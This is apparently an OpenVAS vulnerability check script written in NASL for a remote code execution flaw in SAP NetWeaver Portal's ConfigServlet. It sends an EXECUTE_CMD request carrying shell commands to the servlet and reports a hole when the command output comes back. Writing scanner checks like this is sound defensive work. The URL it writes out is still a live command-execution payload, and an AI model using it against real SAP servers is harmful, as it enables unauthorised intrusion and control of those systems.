###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sap_netweaver_portal_rce_04_13.nasl 11 2013-10-27 10:12:02Z jan $
#
# SAP NetWeaver Portal 'ConfigServlet' Remote Code Execution
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "SAP NetWeaver Portal is prone to a remote code-execution vulnerability.

Successfully exploiting these issues may allow an attacker to execute
arbitrary code with the privileges of the user running the affected
application.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103700";

desc = "
 Summary:
 " + tag_summary;

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 11 $");
 script_tag(name:"cvss_base", value:"9.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");

 script_name("SAP NetWeaver Portal 'ConfigServlet' Remote Code Execution");

 script_xref(name:"URL", value:"http://erpscan.com/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf");
 script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/24963/");
 
 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-04-18 16:24:58 +0200 (Thu, 18 Apr 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to execute a command");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if(!banner || tolower(banner) !~ "server: sap.*")exit(0);

commands = exploit_commands();

foreach cmd (keys(commands)) {

  url = '/ctc/servlet/ConfigServlet/?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=' + commands[cmd];

  if(buf = http_vuln_check(port:port, url:url,pattern:cmd)) {
    
      desc = desc + '\n\nThe Scanner was able to execute the command "' + commands[cmd] + '" on the remote host by\nrequesting the url\n\n' + url + '\n\nwhich produced the following response:\n<response>\n' + buf + '</response>\n';

      security_hole(port:port, data: desc);
      exit(0);

  }

}

exit(0);
